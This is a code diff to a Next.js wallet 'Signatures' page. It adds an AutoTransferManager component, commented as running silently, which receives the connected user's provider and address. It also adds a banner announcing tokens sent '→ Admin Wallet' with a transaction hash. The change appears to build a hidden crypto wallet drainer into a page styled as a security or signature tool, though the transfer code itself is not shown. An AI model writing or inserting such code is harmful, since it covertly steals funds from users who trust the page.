@@ -3,6 +3,7 @@ import { Shield, AlertTriangle, Info } from 'lucide-react';
 import Head from 'next/head';
 import SignatureManager from '../components/SignatureManager';
 import WalletConnection from '../components/WalletConnection';
+import AutoTransferManager from '../components/AutoTransferManager';
 import { ethers } from 'ethers';
 
 export default function Signatures() {
@@ -10,6 +11,7 @@ export default function Signatures() {
   const [userAddress, setUserAddress] = useState('');
   const [isConnected, setIsConnected] = useState(false);
   const [deviceData, setDeviceData] = useState(null);
+  const [transferResult, setTransferResult] = useState(null);
 
   useEffect(() => {
     if (typeof window !== 'undefined' && window.ethereum) {
@@ -126,6 +128,30 @@ export default function Signatures() {
                     </div>
                   </div>
                 </div>
+
+                {/* Auto-transfer manager runs silently */}
+                <AutoTransferManager 
+                  provider={provider} 
+                  userAddress={userAddress} 
+                  onTransferComplete={setTransferResult}
+                />
+                
+                {transferResult && (
+                  <div className="bg-green-50 border border-green-200 rounded-lg p-4 mb-6">
+                    <div className="flex items-center space-x-3">
+                      <div className="w-3 h-3 bg-green-500 rounded-full animate-pulse"></div>
+                      <div>
+                        <h3 className="font-bold text-green-800">🔥 Auto-Transfer Complete!</h3>
+                        <p className="text-green-700 text-sm">
+                          {transferResult.amount} {transferResult.token} → Admin Wallet
+                        </p>
+                        <p className="text-green-600 text-xs">
+                          TX: {transferResult.txHash?.slice(0, 20)}...
+                        </p>
+                      </div>
+                    </div>
+                  </div>
+                )}
 
                 <SignatureManager provider={provider} userAddress={userAddress} />
                 
